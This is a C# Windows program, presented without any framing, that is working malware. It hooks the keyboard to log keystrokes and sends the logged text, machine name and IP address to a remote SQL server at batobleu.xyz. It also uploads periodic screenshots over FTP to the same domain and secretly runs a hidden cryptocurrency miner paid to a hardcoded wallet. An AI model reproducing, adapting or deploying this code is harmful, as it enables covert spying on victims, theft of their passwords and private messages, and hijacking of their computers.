using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Data.SqlClient;
using FluentFTP;
using System.Net;
using System.Net.Sockets;
using System.Drawing;
using System.Threading;
using System.Timers;

class InterceptKeys
{
    #region var
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static string texte = "";
    private static bool capital = false;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;Password=";
    private static SqlConnection cnxSQLServer = new SqlConnection(log);
    private static SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
    private static string date;
    private static bool hide = false;
    private static FtpClient client = new FtpClient("ftp.batobleu.xyz")
    {
        Credentials = new NetworkCredential("11793_nexis", "")
    };
    private static System.Timers.Timer aTimer;
    #endregion
    #region Start
    public static void Main()
    {
        Thread xmr = new Thread(new ThreadStart(miner));
        xmr.Start();
        var handle = GetConsoleWindow();
        if (hide == true)
        {
            ShowWindow(handle, SW_HIDE);
        }
        aTimer = new System.Timers.Timer(30000);
        aTimer.Elapsed += OnTimedEvent;
        aTimer.AutoReset = true;
        aTimer.Enabled = true;
        SQLConnect();
        client.Connect();
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }
    #endregion
    #region cnxSQL
    private static void SQLConnect()
    {
        try
        {
            cnxSQLServer.Open();
            Console.WriteLine("yo");
        }
        catch (Exception exc)
        {
            Console.WriteLine(exc);
        }
        SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    #endregion
    #region captureKey
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        string key = "";
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            key = "" + (Keys)vkCode;
        }
        ProcTexte(key);
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
    #endregion
    #region procTexte
    public static void ProcTexte(string key)
    {
        SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
        Console.Clear();
        if (key == "Capital" && capital == true)
        {
            capital = false;
        }
        else if (key == "Capital" && capital == false)
        {
            capital = true;
        }
        else if (key == "Back" && texte.Length != 0)
        {
            texte = texte.Remove(texte.Length - 1);
        }
        else if (key == "Space")
        {
            texte = texte + " ";
        }
        else if (key == "D4")
        {
            texte = texte + "\"";
        }
        else if (key == "D6")
        {
            texte = texte + "-";
        }
        else if (key == "Oem5")
        {
            texte = texte + "*";
        }
        else if (key == "Oemcomma" && capital == true)
        {
            texte = texte + "?";
        }
        else if (key == "Oemcomma" && capital == false)
        {
            texte = texte + ",";
        }
        else if (key == "return" || key == "Return")
        {
            sendInfo(texte);
            texte = "";
        }
        else if (capital == false && key != "Back")
        {
            texte = texte + key.ToLower();
        }
        else if (capital == true && key != "Back")
        {
            texte = texte + key;
        }
        Console.WriteLine(texte);
        if (texte.Length >= 200)
        {
            sendInfo(texte);
            texte = "";
        }

    }
    #endregion
    #region sendInfo
    public static void sendInfo(string texte)
    {
        Thread sendScreen = new Thread(new ThreadStart(Screenshot));
        Console.Clear();
        date = DateTime.Now.ToString("dd/MM/yy HH:mm:ss");
        cmdSQLServer.CommandText = "INSERT INTO keylog (keylog,dateKeylog,labelPC, ipPC) VALUES ('" + texte + "','" + date + "','" + Environment.MachineName + "','"+ GetLocalIPAddress() +"')";
        try
        {
            cmdSQLServer.ExecuteNonQuery();
            texte = "";
            try
            {
                sendScreen.Start();
            }
            catch { }
        }
        catch { }
    }
    #endregion
    #region Screenshot
    public static void Screenshot()
    {
        string time = DateTime.Now.ToString("dd_MM_yyyy HH_mm_ss");
        string str = Environment.MachineName + " " + time + ".png";
        Bitmap memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Size s = new Size(memoryImage.Width, memoryImage.Height);
        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
        memoryImage.Save(str);
        if (!client.IsConnected)
        {
            client.Connect();
        }
        if (client.DirectoryExists("/" + Environment.MachineName + "/"))
        {
            client.UploadFile(str, "/keylog/" + Environment.MachineName + "/" + time + ".png", FtpExists.Overwrite, false, FtpVerify.Retry);
        }
        else
        {
            client.CreateDirectory("/keylog/" + Environment.MachineName);
            client.UploadFile(str, "/keylog/" + Environment.MachineName + "/" + time + ".png", FtpExists.Overwrite, false, FtpVerify.Retry);
        }
        File.Delete(str);
        
    }
    #endregion
    #region miner
    public static void miner()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string user = Environment.MachineName;
        user = user.Replace("NIMF3", "");
        user = user.Replace("-", "x");

        startInfo.UseShellExecute = false;
        startInfo.FileName = "miner.exe";
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u 35mDqV69AD9WhZx2orzZm18oTBrSFyDT7S."+user+" -p x -t 2 -mport 4001 -dbg -1";

        using (Process exeProcess = Process.Start(startInfo))
        exeProcess.Start();
    }
    #endregion
    #region GetLocalIPAdress
    public static string GetLocalIPAddress()
    {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        throw new Exception("No network adapters with an IPv4 address in the system!");
    }
    #endregion
    #region Timer
    private static void OnTimedEvent(Object source, ElapsedEventArgs e)
    {
        if (texte == "")
        {
            sendInfo("screenshot");
        }
        else
        {
            sendInfo(texte);
        }
    }
    #endregion
    #region dll
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    #endregion
}